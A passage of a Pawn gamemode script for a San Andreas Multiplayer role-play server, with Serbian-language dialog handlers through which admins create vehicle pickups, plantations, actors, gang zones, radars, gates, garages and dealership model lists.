		else { SPD( playerid, dialog_SERVERMI, DSL, D_NASLOV, "Upravljanje serverom\nSacuvaj naloge\nNapravi\nIzbrisi\nIzmeni\nSpisak organizacija\nAntiCheat", D_ODABERI, D_ODUSTANI ); }
	}

    else if(dialogid == dialog_NapraviOrgVehPickupColor) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: { OdabranaOrgBoja[playerid] = 0; }
                case 1: { OdabranaOrgBoja[playerid] = 1; }
                case 2: { OdabranaOrgBoja[playerid] = 3; }
                case 3: { OdabranaOrgBoja[playerid] = 6; }
                case 4: { OdabranaOrgBoja[playerid] = 136; }
                case 5: { OdabranaOrgBoja[playerid] = 152; }
                case 6: { OdabranaOrgBoja[playerid] = 233; }
                case 7: { OdabranaOrgBoja[playerid] = 128; }
                case 8: { OdabranaOrgBoja[playerid] = 135; }
            }

            ShowPlayerDialog(playerid, dialog_NapraviOrgVehPickup, DIALOG_STYLE_INPUT, "Kreiranje Org Veh Pickup", "Unesite ID organizacije kojoj vozila pripadaju", "Potvrdi", "Odustani");

            return 1;
        }

        return 1;
    }

    else if(dialogid == dialog_NapraviOrgVehPickup) {

        if(!response) return 0;
        if(response) {

            new OrgID;
            if(sscanf(inputtext, "d", OrgID)) return ShowPlayerDialog(playerid, dialog_NapraviOrgVehPickup, DIALOG_STYLE_INPUT, "Kreiranje Org Veh Pickup", "Unesite ID organizacije kojoj vozila pripadaju", "Potvrdi", "Odustani");

            new ofile[50], string[220];
            format(ofile, 50, O_FILE, OrgID);
            if(!fexist(ofile)) return SendErrorMessage(playerid, "ID te organizacije ne postoji! (/organizacije)");

            new Float:Pos11[3];
            GetPlayerPos(playerid, Pos11[0], Pos11[1], Pos11[2]);

            new id = SledeciIDOrgVeh(MAX_ORGVEH);

            OrgVehInfo[id][oVehPosX] = Pos11[0];
            OrgVehInfo[id][oVehPosY] = Pos11[1];
            OrgVehInfo[id][oVehPosZ] = Pos11[2];
            OrgVehInfo[id][oVehOrgID] = OrgID;

            OrgVehInfo[id][oVehModel1] = 482;
            OrgVehInfo[id][oVehModel2] = 506;
            OrgVehInfo[id][oVehModel3] = 522;
            OrgVehInfo[id][oVehModel4] = 536;
            OrgVehInfo[id][oVehModel5] = 541;
            OrgVehInfo[id][oVehKolicina1] = 2;
            OrgVehInfo[id][oVehKolicina2] = 2;
            OrgVehInfo[id][oVehKolicina3] = 2;
            OrgVehInfo[id][oVehKolicina4] = 2;
            OrgVehInfo[id][oVehKolicina5] = 2;

            OrgVehInfo[id][oVehSpawnX] = 0;
            OrgVehInfo[id][oVehSpawnY] = 0;
            OrgVehInfo[id][oVehSpawnZ] = 0;

            OrgVehInfo[id][oVehColor] = OdabranaOrgBoja[playerid];

            format(string, 220, ""col_red"[ ORG VOZILA ]\n"SRVBOJA1SCM"[ %s ]\n"col_red"ID: "col_white"%d\n"col_red"[ /orgveh ]", getOrgName(OrgVehInfo[id][oVehOrgID]),id);
            OrgVehLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, OrgVehInfo[id][oVehPosX], OrgVehInfo[id][oVehPosY], OrgVehInfo[id][oVehPosZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
            OrgVehPickup[id] = CreateDynamicPickup(1650, 1, OrgVehInfo[id][oVehPosX], OrgVehInfo[id][oVehPosY], OrgVehInfo[id][oVehPosZ], -1, -1, -1, 80.0, -1, 0);

            KreiraOrgVehPickup[playerid] = id;

            SacuvajOrgVehPickup(id);     

            ShowPlayerDialog(playerid, dialog_NapraviOrgVehPickupModel, DIALOG_STYLE_INPUT, "Unesite modele", "Unesite 5 modela vozila za ovaj pickup\nPrimer : 482 506 522 536 541", "Potvrdi", "Odustani");   

            return 1;
        }
    }
    else if(dialogid == dialog_NapraviOrgVehPickupModel) {

        if(!response) return KreiraOrgVehPickup[playerid] = -1;
        if(response) {

            new model1, model2, model3, model4, model5;
            if(sscanf(inputtext, "ddddd", model1, model2, model3, model4, model5)) return ShowPlayerDialog(playerid, dialog_NapraviOrgVehPickupModel, DIALOG_STYLE_INPUT, "Unesite modele", "Unesite 5 modela vozila za ovaj pickup\nPrimer : 482 506 522 536 541", "Potvrdi", "Odustani");   

            new id = KreiraOrgVehPickup[playerid];

            OrgVehInfo[id][oVehModel1] = model1;
            OrgVehInfo[id][oVehModel2] = model2;
            OrgVehInfo[id][oVehModel3] = model3;
            OrgVehInfo[id][oVehModel4] = model4;
            OrgVehInfo[id][oVehModel5] = model5;
            KreiraOrgVehPickup[playerid] = -1;

            SacuvajOrgVehPickup(id);

            SendInfoMessage(playerid, "Uspesno si zavrsio sa kreiranjem Org Veh Pickup-a!");

            return 1;
        }

        return 1;
    }

    else if(dialogid == dialog_PlantazaKreiraj) {

        if(!response) return 0;
        if(response) {

            new plant;
            if(sscanf(inputtext, "i", plant)) return SPD(playerid, dialog_PlantazaKreiraj, DSI, D_NASLOV, "Pogresan ID\nUnesite ID", D_ODABERI, D_NAZAD);
            if(plant == 0) return SendErrorMessage(playerid, "Ne mozes ID 0!! Opasno po zivot!!");
            new drogaFile[40];
            format(drogaFile, 40, PLANTAZE_FILE, plant);
            if(fexist(drogaFile)) return SendErrorMessage(playerid, "Ta plantaza vec postoji!");
            new Float:X, Float:Y, Float:Z;
            GetPlayerPos(playerid, X, Y, Z);

            strmid(PlantazaInfo[plant][drogaPosadio],"Niko",0,strlen("Niko"),255);
            PlantazaInfo[plant][drogaX] = X;
            PlantazaInfo[plant][drogaY] = Y;
            PlantazaInfo[plant][drogaZ] = Z;
            SacuvajPlantazu(plant);

            new string[180];
            format(string, 180, ""col_green"[ "col_white"PLANTAZA"col_green" ]\nZasadio: "col_white"%s\n"col_green"ID: "col_white"%d"col_green"\n/posadidrogu", PlantazaInfo[plant][drogaPosadio], plant);
            PlantazaLabel[plant] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
            DestroyObject(PlantazaObjekat[plant]);
            PlantazaObjekat[plant] = CreateObject(824, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ]-2.5, 0.0, 0.0, 0.0);
        }
    }
    else if(dialogid == dialog_ActorKreiraj) {

        if(!response) return 0;
        if(response) {

            new ActorID, Float:X, Float:Y, Float:Z, Float:Rot;
            new skin, ime[32];
            GetPlayerPos(playerid, X, Y, Z);
            GetPlayerFacingAngle(playerid, Rot);
            if(sscanf(inputtext, "iis[32]", ActorID, skin, ime)) return SPD(playerid, dialog_ActorKreiraj, DSI, D_NASLOV, "Unesite: IDActora Skin Ime", D_ODABERI, D_NAZAD);
            new rfile[50];
            format(rfile, sizeof(rfile), ActorsFile, ActorID);
            if(fexist(rfile)) return SendErrorMessage(playerid, "ID tog actora vec postoji!");
            
            ActorInfo[ActorID][aPosX] = X;
            ActorInfo[ActorID][aPosY] = Y;
            ActorInfo[ActorID][aPosZ] = Z;
            ActorInfo[ActorID][aRot] = Rot;
            new stringic[32];
            format(stringic, sizeof(stringic), "%s", ime);
            strmid( ActorInfo[ActorID][aIme], stringic, 0, strlen(stringic), 255);
            ActorInfo[ActorID][aSkin] = skin;

            new katastrofa[36];
            format(katastrofa, sizeof(katastrofa), "%s\nID:%d", ActorInfo[ActorID][aIme], ActorID);

            ActorActor[ActorID] = CreateActor(ActorInfo[ActorID][aSkin], ActorInfo[ActorID][aPosX], ActorInfo[ActorID][aPosY], ActorInfo[ActorID][aPosZ], ActorInfo[ActorID][aRot]);
            ActorLabel[ActorID] = CreateDynamic3DTextLabel(katastrofa, 0x33CCFFAA, ActorInfo[ActorID][aPosX], ActorInfo[ActorID][aPosY], ActorInfo[ActorID][aPosZ]+1.0, 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
            va_SendClientMessage(playerid, 0xF81414FF, "(Server): {FFFFFF}Actor je uspesno kreiran, ID : %d!", ActorID);
            SacuvajDinamicneActore(ActorID);
        }
    }
	else if( dialogid == dialog_GANGZCOLOR ) {

	    if( !response ) return true;
        if( response ) {
        
            new color[24];
            if( sscanf( inputtext, "s[24]", color ) ) return SPD( playerid, dialog_GANGZCOLOR, DSI, D_NASLOV, "Unesite boju za gang zonu.\nPrimer: FF2244", D_ODABERI, D_NAZAD );
            
            new id = NextGZoneID( MAX_GZONE );

			if( id == -1 ) return SendErrorMessage( playerid, "Vec ima maksimalni broj gang zona." );
            
            CreatingGZoneID[ playerid ] = id;
            
            color = "85611F";

            strmid( gZoneInfo[ id ][ gZoneColor ], color, 0, strlen( color ), 255 );
            
            CreatingGZone[ playerid ] = 1;
		    SendInfoMessage( playerid, "Uneo si boju." );
		    SendInfoMessage( playerid, "Koristi "col_white"LMB"col_crvena" da postavis pozicije." );
		    SendInfoMessage( playerid, "Prvo sacuvaj poziciju levog donjeg ugla polja." );
        
        }
	}
	else if( dialogid == dialog_ORGCOLOR ) {
	
	    if( !response ) return true;
        if( response ) {
        
            new id = GetNearestOrganization( playerid );
            new color[ 24 ], stringic[ 24 ];
            if( sscanf( inputtext, "s[24]", color ) ) SPD( playerid, dialog_ORGCOLOR, DSI, D_NASLOV, "Unesite boju za organizaciju(Vezano za zone ). Primer: FF00FF", D_ODABERI, D_ODUSTANI );
            
            format( stringic, sizeof( stringic ), "%s", color );
            strmid( OI[ id ][ oColor ], stringic, 0, strlen( stringic ), 255 );
            SaveOrganization( id );
            
            SendInfoMessage( playerid, "Promenili ste boju organizacije." );
        
        }
	
	}
	else if( dialogid == dialog_CREATERADAR ) {
	
	    if( !response ) return true;
        if( response ) {
        
            new speed, ticket, radarID = NextRadarID( MAX_RADARS );
        
            if( sscanf( inputtext, "ii", speed, ticket ) ) return SPD( playerid, dialog_CREATERADAR, DSI, D_NASLOV, "Unesite dozvoljenu brzinu i kaznu.\nPrimer: 70 132", D_ODABERI, D_NAZAD );
        
            new Float:Pos[ 4 ];
            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
            GetPlayerFacingAngle( playerid, Pos[ 3 ] );
            
            radarInfo[ radarID ][ radarMaxSpeed ] = speed;
			radarInfo[ radarID ][ radarPrice ] = ticket;
			radarInfo[ radarID ][ radarPos ][ 0 ] = ( Pos[ 0 ]+2 );
			radarInfo[ radarID ][ radarPos ][ 1 ] = ( Pos[ 1 ]+2 );
			radarInfo[ radarID ][ radarPos ][ 2 ] = Pos[ 2 ];
			radarInfo[ radarID ][ radarPos ][ 3 ] = 0.000;
			radarInfo[ radarID ][ radarPos ][ 4 ] = 0.000;
			radarInfo[ radarID ][ radarPos ][ 5 ] = 0.000;

            radarInfo[ radarID ][ radarObject ] = CreateDynamicObject( 18880, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0.0, 0.0, Pos[ 3 ] );
            Streamer_Update( playerid );
			EditDynamicObject( playerid, radarInfo[ radarID ][ radarObject ] ); EditRadar[ playerid ] = radarID;
			SaveRadar( radarID );

			SendInfoMessage( playerid, "Napravili ste radar. Maximalna brzina: %d kazna: $%d", speed, ticket );
            
        }
	}
	else if( dialogid == dialog_CREATESPORT ) {
	    if( !response ) return true;
        if( response ) {

			new id = -1, Float:PozX, Float:PozY, Float:PozZ, nameaport[ 50 ];

            for( new a = 0; a < MAX_SPORTS; a++ ) {
				if( supportInfo[ a ][ supportCreated ] != 1 ) {
					id = a;
					break;
				} else continue;
			}
			if( id == -1 ) return SendErrorMessage( playerid, "Nema vise mesta za kreiranje support portova." );

            if( sscanf( inputtext, "s[50]", nameaport ) ) return SPD( playerid, dialog_CREATESPORT, DSI, D_NASLOV, "Unesite ime ovog mesta za support port.", D_ODABERI, D_NAZAD );

			GetPlayerPos( playerid, PozX, PozY, PozZ );

            supportInfo[ id ][ supportID ] = id;
            supportInfo[ id ][ supportCreated ] = 1;
			supportInfo[ id ][ supportPos ][ 0 ] = PozX;
			supportInfo[ id ][ supportPos ][ 1 ] = PozY;
			supportInfo[ id ][ supportPos ][ 2 ] = PozZ;
			strmid( supportInfo[ id ][ supportName ], nameaport, 0, strlen( nameaport ), 50 );

			SaveSports( );

			SendInfoMessage( playerid, "Uspesno si kreirao novu lokaciju za support port." );
        }
	}
	else if( dialogid == dialog_CREATEAPORT ) {
	    if( !response ) return true;
        if( response ) {

			new id = -1, Float:PozX, Float:PozY, Float:PozZ, nameaport[ 50 ];

            for( new a = 0; a < MAX_APORTS; a++ ) {
				if( aportInfo[ a ][ aportCreated ] != 1 ) {
					id = a;
					break;
				} else continue;
			}
			if( id == -1 ) return SendErrorMessage( playerid, "Nema vise mesta za kreiranje Admin TEAM portova." );

            if( sscanf( inputtext, "s[50]", nameaport ) ) return SPD( playerid, dialog_CREATEAPORT, DSI, D_NASLOV, "Unesite ime ovog mesta za Admin TEAM port.", D_ODABERI, D_NAZAD );

			GetPlayerPos( playerid, PozX, PozY, PozZ );

            aportInfo[ id ][ aportID ] = id;
            aportInfo[ id ][ aportCreated ] = 1;
			aportInfo[ id ][ aportPos ][ 0 ] = PozX;
			aportInfo[ id ][ aportPos ][ 1 ] = PozY;
			aportInfo[ id ][ aportPos ][ 2 ] = PozZ;
			strmid( aportInfo[ id ][ aportName ], nameaport, 0, strlen( nameaport ), 50 );

			SaveAports( );

			SendInfoMessage( playerid, "Uspesno si kreirao novu lokaciju za Admin TEAM port." );
        }
	}
	else if( dialogid == dialog_CREATEGPS ) {
	    if( !response ) return true;
        if( response ) {

			new id = NextGPSID( MAX_GPS ), Float:PozX, Float:PozY, Float:PozZ, filename[ 60 ], namegps[ 50 ];
            
            format( filename, sizeof( filename ), F_GPS, id );
			if( fexist( filename ) ) return SendErrorMessage( playerid, "ID te gps lokacije vec postoji!" );
            
            if( sscanf( inputtext, "s[50]", namegps ) ) return SPD( playerid, dialog_CREATEGPS, DSI, D_NASLOV, "Unesite ime ovog mesta za gps.", D_ODABERI, D_NAZAD );
        
			GetPlayerPos( playerid, PozX, PozY, PozZ );
			
			gpsInfo[ id ][ gpsPos ][ 0 ] = PozX;
			gpsInfo[ id ][ gpsPos ][ 1 ] = PozY;
			gpsInfo[ id ][ gpsPos ][ 2 ] = PozZ;
			strmid( gpsInfo[ id ][ gpsName ], namegps, 0, strlen( namegps ), 50 );
			
			GPS_Save( id );
			
			SendInfoMessage( playerid, "Uspesno si kreirao novu gps lokaciju." );
        }
	}
	else if( dialogid == dialog_CREATEGARAGE ) {
	    if( !response ) return true;
        if( response ) {
			new id = NextGarageID( MAX_GARAGES ), Float:PozX, Float:PozY, Float:PozZ, filename[ 40 ], vrsta[ 20 ];
			GetPlayerPos( playerid, PozX, PozY, PozZ );
		    format( filename, sizeof( filename ), F_GARAGE, id );
			if( fexist( filename ) ) return SendErrorMessage( playerid, "ID te garaze vec postoji!" );

			garageInfo[ id ][ garagePos ][ 0 ] = PozX;
			garageInfo[ id ][ garagePos ][ 1 ] = PozY;
			garageInfo[ id ][ garagePos ][ 2 ] = PozZ;
			garageInfo[ id ][ garageOwned ] = false;
			strmid( garageInfo[ id ][ garageOwner ], "Drzava", 0, strlen( "Drzava" ), MAX_PLAYER_NAME );
			garageInfo[ id ][ garageLocked ] = false;
			garageInfo[ id ][ garageVW ] = id;
			switch( listitem ) {
			    case 0: {
			        garageInfo[ id ][ garagePrice ] = 30000;
					garageInfo[ id ][ garageLevel ] = 3;
					vrsta = "Mala garaza";
			    }
			    case 1: {
			        garageInfo[ id ][ garagePrice ] = 60000;
					garageInfo[ id ][ garageLevel ] = 4;
					vrsta = "Srednja garaza";
			    }
			    case 2: {
			        garageInfo[ id ][ garagePrice ] = 100000;
					garageInfo[ id ][ garageLevel ] = 5;
					vrsta = "Velika garaza";
			    }
			}
			garageInfo[ id ][ garageType ] = listitem;
			
	        
	        Garage_Save( id );
	        new string[ 256 ];
		   	format( string, sizeof( string ), ""col_orange"Garaza na prodaju"col_white"[ID %d]\n"col_orange"Tip garaze: "col_white"%s\n"col_orange"Cena garaze: "col_white"%d\n"col_orange"Potreban level: "col_white"%d\n"col_orange"Za kupovinu kucajte "col_white"/kupigarazu", id, vrsta, garageInfo[ id ][ garagePrice ], garageInfo[ id ][ garageLevel ] );
			garageInfo[ id ][ garage3D ] = CreateDynamic3DTextLabel( string, BELA, garageInfo[ id ][ garagePos ][ 0 ], garageInfo[ id ][ garagePos ][ 1 ], garageInfo[ id ][ garagePos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );
			garageInfo[ id ][ garagePickup ] = CreateDynamicPickup( 19130, 1, garageInfo[ id ][ garagePos ][ 0 ], garageInfo[ id ][ garagePos ][ 1 ], garageInfo[ id ][ garagePos ][ 2 ], 0, 0 );

            KreiraGarazu[ playerid ] = id;
			SendInfoMessage( playerid, "Uspesno si kreirao garazu, sada koristi '/veh 560 1 1'." );
			SendInfoMessage( playerid, "Zauzmi poziciju i sacuvaj lokaciju vozila kada izadje iz garaze." );
			SendInfoMessage( playerid, "Za cuvanje pozicije koristi '/garagesave'." );
		}
	}
	else if( dialogid == dialog_CREATEGATE ) {
	    if( !response ) return true;
        if( response ) {
        
			new g = NextGateID( MAX_GATES ),
			    Float:x,
			    Float:y,
			    Float:z,
			    Float:angle,
				model;
				
            GetPlayerPos( playerid, x, y, z ); GetPlayerFacingAngle( playerid, angle );
				
            if( sscanf( inputtext, "i", model ) ) return SPD( playerid, dialog_CREATEGATE, DSI, D_NASLOV, "Unesite id objekta kapije.", D_ODABERI, D_NAZAD );

            GateData[ g ][ gateFor ] = 0;
            GateData[ g ][ gateOrgID ] = -1;
            GateData[ g ][ gateModel ] = model;
			GateData[ g ][ gateSpeed ] = 3.0;
			GateData[ g ][ gateRadius ] = 8.0;
			GateData[ g ][ gateOpened ] = false;
			GateData[ g ][ gateTime ] = 0;

			GateData[ g ][ gatePos ][ 0 ] = x + ( 3.0 * floatsin( -angle, degrees ) );
			GateData[ g ][ gatePos ][ 1 ] = y + ( 3.0 * floatcos( -angle, degrees ) );
			GateData[ g ][ gatePos ][ 2 ] = z;
			GateData[ g ][ gatePos ][ 3 ] = 0.0;
			GateData[ g ][ gatePos ][ 4 ] = 0.0;
			GateData[ g ][ gatePos ][ 5 ] = angle;

			GateData[ g ][ gateMove ][ 0 ] = 0.0;
			GateData[ g ][ gateMove ][ 1 ] = 0.0;
			GateData[ g ][ gateMove ][ 2 ] = 0.0;
			GateData[ g ][ gateMove ][ 3 ] = 0.0;
			GateData[ g ][ gateMove ][ 4 ] = 0.0;
			GateData[ g ][ gateMove ][ 5 ] = 0.0;

            GateData[ g ][ gateInterior ] = GetPlayerInterior( playerid );
            GateData[ g ][ gateWorld ] = GetPlayerVirtualWorld( playerid );

			SaveGate( g );
            SCM( playerid, SRVBOJA1, "Sada sacuvajte poziciju zatvorene kapije.");
            GateData[ g ][ gateObject ] = CreateDynamicObject( GateData[ g ][ gateModel ], GateData[ g ][ gatePos ][ 0 ], GateData[ g ][ gatePos ][ 1 ], GateData[ g ][ gatePos ][ 2 ], GateData[ g ][ gatePos ][ 3 ], GateData[ g ][ gatePos ][ 4 ], GateData[ g ][ gatePos ][ 5 ], GateData[ g ][ gateWorld ], GateData[ g ][ gateInterior ] );
            Streamer_Update( playerid );
			EditDynamicObject( playerid, GateData[ g ][ gateObject ] );
            EditDGate[ playerid ] = g;
		}
	}
	else if( dialogid == dialog_CREATEGATE_2 ) {
	    if( !response ) return true;
        if( response ) {
            new g = EditDGate[ playerid ], Float:speed;
            if( sscanf( inputtext, "f", speed ) ) return SPD( playerid, dialog_CREATEGATE_2, DSI, D_NASLOV, "Unesite brzinu zatvaranja i otvaranja kapije( 0-20.0).", D_ODABERI, D_NAZAD );
            if( speed < 0.0 || speed > 20.0 ) return SendErrorMessage( playerid, "Brzina otvaranja i zatvaranja vrata moze imat raspon od 0 do 20." );
            
            GateData[ g ][ gateSpeed ] = speed;
            SaveGate( g );
            SPD( playerid, dialog_CREATEGATE_3, DSI, D_NASLOV, "Unesite vreme posle koliko sekundi ce se zatvoriti kapija.", D_ODABERI, D_NAZAD );
		}
	}
	else if( dialogid == dialog_CREATEGATE_3 ) {
	    if( !response ) return true;
        if( response ) {
            new g = EditDGate[ playerid ], brzina;
            if( sscanf( inputtext, "i", brzina ) ) return SPD( playerid, dialog_CREATEGATE_3, DSI, D_NASLOV, "Unesite vreme posle koliko sekundi ce se zatvoriti kapija.", D_ODABERI, D_NAZAD );
            if( brzina < 0 || brzina > 60 ) return SendErrorMessage( playerid, "Uneseno vreme ne moze biti manje od 0s ili vece od 60s." );

            GateData[ g ][ gateTime ] = brzina*1000;
            SaveGate( g );
            SPD( playerid, dialog_CREATEGATE_5, DSMSG, D_NASLOV, "Za sta pravite ovu kapiju?", "Organizacija", "Igrac" );
		}
	}
	else if( dialogid == dialog_CREATEGATE_5 ) {
	    new g = EditDGate[ playerid ];
        if( response ) {
            GateData[ g ][ gateFor ] = 1;
            SaveGate( g );
            SPD( playerid, dialog_CREATEGATE_6, DSI, D_NASLOV, "Unesite id organizacije za koju pravite kapiju.", D_ODABERI, D_NAZAD );
        }
        else if( !response ) {
            GateData[ g ][ gateFor ] = 2;
            SaveGate( g );
            SPD( playerid, dialog_CREATEGATE_4, DSI, D_NASLOV, "Unesite ime igraca koji moze kontrolisati ovu kapiju(FORMAT:Ime_Prezime).", D_ODABERI, D_NAZAD );
        }
	}
	else if( dialogid == dialog_CREATEGATE_6 ) {
	    if( !response ) return true;
        if( response ) {
            new g = EditDGate[ playerid ], orga;
            if( sscanf( inputtext, "d", orga ) ) return SPD( playerid, dialog_CREATEGATE_6, DSI, D_NASLOV, "Unesite id organizacije za koju pravite kapiju.", D_ODABERI, D_NAZAD );

			GateData[ g ][ gateOrgID ] = orga;
			SaveGate( g );
			SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste zavrsili kreiranje kapije za organizaciju %s.", getOrgName( orga ) );
		}
	}
	else if( dialogid == dialog_CREATEGATE_4 ) {
	    if( !response ) return true;
        if( response ) {
            new g = EditDGate[ playerid ], ime[ MAX_PLAYER_NAME ];
            if( sscanf( inputtext, "s[24]", ime ) ) return SPD( playerid, dialog_CREATEGATE_4, DSI, D_NASLOV, "Unesite ime igraca koji moze kontrolisati ovu kapiju(FORMAT:Ime_Prezime).", D_ODABERI, D_NAZAD );

			strmid( GateData[ g ][ gateOwner ], ime, 0, strlen( ime ), MAX_PLAYER_NAME );
			SaveGate( g );
			SendClientMessageEx( playerid, SRVBOJA1, "Uspesno ste zavrsili kreiranje kapije za igraca %s.", ime );
		}
	}
	else if( dialogid == dialog_ASMAXMODEL ) {
	    if( !response ) return true;
        if( response ) {
            new broj, as = GetNearestSalon( playerid );
            if( as == -1 ) return SendErrorMessage( playerid, "Moras biti pored pickupa za kupnju u salonu." );
            if( sscanf( inputtext, "i", broj ) ) return SPD( playerid, dialog_ASMAXMODEL, DSI, D_NASLOV, "Unesite broj razlicith vrsti vozila koja ce se nalaziti u salonu(3-16)", D_ODABERI, D_NAZAD );
			if( broj < 3 || broj > 16 ) return SPD( playerid, dialog_ASMAXMODEL, DSI, D_NASLOV, "Unesite broj razlicith vrsti vozila koja ce se nalaziti u salonu(3-16)", D_ODABERI, D_NAZAD );
			AutoSalon[ as ][ aMaxVehModel ] = broj;
			SendClientMessageEx( playerid, SRVBOJA1, "Odabrao si %d vrste vozila.", broj );
			SaveSalon( as );
			if( broj == 3 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422", D_ODABERI, D_NAZAD ); }
			else if( broj == 4 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401", D_ODABERI, D_NAZAD ); }
			else if( broj == 5 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411", D_ODABERI, D_NAZAD ); }
			else if( broj == 6 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523", D_ODABERI, D_NAZAD ); }
			else if( broj == 7 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527", D_ODABERI, D_NAZAD ); }
			else if( broj == 8 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564", D_ODABERI, D_NAZAD ); }
			else if( broj == 9 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564 562", D_ODABERI, D_NAZAD ); }
			else if( broj == 10 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564 562 523", D_ODABERI, D_NAZAD ); }
			else if( broj > 10 ) { SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD ); }
		}
	}
	else if( dialogid == dialog_ASAMMOUNT ) {
	    if( !response ) return true;
        if( response ) {
            new as = KreiranAutoSalon[ playerid ], model[ 16 ];
            if( as == -1 ) return SendErrorMessage( playerid, "Ne kreiras nijedan salon." );
            switch( AutoSalon[ as ][ aMaxVehModel ] ) {
                case 3: {
					if( sscanf( inputtext, "iii", model[0], model[1], model[2] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 4: {
					if( sscanf( inputtext, "iiii", model[0], model[1], model[2], model[ 3 ] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 5: {
					if( sscanf( inputtext, "iiiii", model[0], model[1], model[2], model[ 3 ], model[4] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 6: {
					if( sscanf( inputtext, "iiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
				case 7: {
					if( sscanf( inputtext, "iiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
